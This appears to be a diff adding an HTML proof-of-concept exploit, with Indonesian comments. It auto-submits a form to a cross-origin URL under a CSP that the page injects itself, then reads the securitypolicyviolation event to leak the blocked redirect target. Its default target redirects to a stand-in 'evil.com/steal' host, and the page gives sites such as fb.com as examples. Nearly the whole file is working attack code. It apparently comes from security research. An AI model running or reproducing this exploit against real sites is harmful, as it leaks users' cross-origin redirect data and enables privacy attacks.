@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <title>Dynamic CSP Leak PoC</title>
+    <script>
+        // 1. Ambil parameter dari URL saat halaman dimuat
+        // Contoh pemakaian: poc.html?url=https://fb.com/4&domain=https://fb.com
+        const params = new URLSearchParams(window.location.search);
+
+        // Setup nilai default jika parameter tidak diisi di URL
+        const targetUrl = params.get('url') || 'https://httpbin.org/redirect-to?url=https://evil.com/steal&status_code=302';
+        const allowedDomain = params.get('domain') || 'https://httpbin.org';
+
+        // 2. Inject aturan CSP secara dinamis ke dalam tag <meta>
+        const metaCSP = document.createElement('meta');
+        metaCSP.setAttribute('http-equiv', 'Content-Security-Policy');
+        metaCSP.setAttribute('content', `default-src 'self' 'unsafe-inline'; form-action 'self' ${allowedDomain};`);
+        document.head.appendChild(metaCSP);
+    </script>
+</head>
+
+<body>
+    <h1>Dynamic CSP Redirect Leak</h1>
+    <p>Targeting URL: <strong id="displayUrl"></strong></p>
+    <p>Allowed Domain (CSP): <strong id="displayDomain"></strong></p>
+    <hr>
+    <p>Status: <span id="status" style="font-weight: bold; color: blue;">Running exploit...</span></p>
+
+    <form id="autoExploitForm" method="GET"></form>
+
+    <div id="log" style="margin-top: 20px; color: red; font-weight: bold;"></div>
+
+    <script>
+        // Tampilkan parameter di UI biar gampang nge-track
+        document.getElementById('displayUrl').innerText = targetUrl;
+        document.getElementById('displayDomain').innerText = allowedDomain;
+
+        // 3. Setup listener untuk menangkap kebocoran
+        document.addEventListener('securitypolicyviolation', (e) => {
+            document.getElementById('status').innerText = "VIOLATION DETECTED!";
+            document.getElementById('status').style.color = "red";
+
+            const leakData = {
+                directive: e.violatedDirective,
+                leakedBlockedURI: e.blockedURI
+            };
+
+            const resultDiv = document.getElementById('log');
+            resultDiv.innerHTML = `
+                <h3>🚨 LEAKED DATA:</h3>
+                <pre style="background: #eee; padding: 15px; border: 2px solid red; overflow-x: auto;">
+${JSON.stringify(leakData, null, 2)}
+                </pre>
+            `;
+
+            console.error("Leak detected!", leakData);
+        });
+
+        // 4. Eksekusi form secara otomatis
+        window.onload = () => {
+            console.log(`Setting up form to target: ${targetUrl}`);
+            const form = document.getElementById('autoExploitForm');
+            form.action = targetUrl;
+
+            console.log("Triggering automated form submission...");
+            // Kasih delay sedikit (opsional) untuk memastikan DOM & CSP siap
+            setTimeout(() => {
+                form.submit();
+            }, 500);
+        };
+    </script>
+</body>
+
+</html>
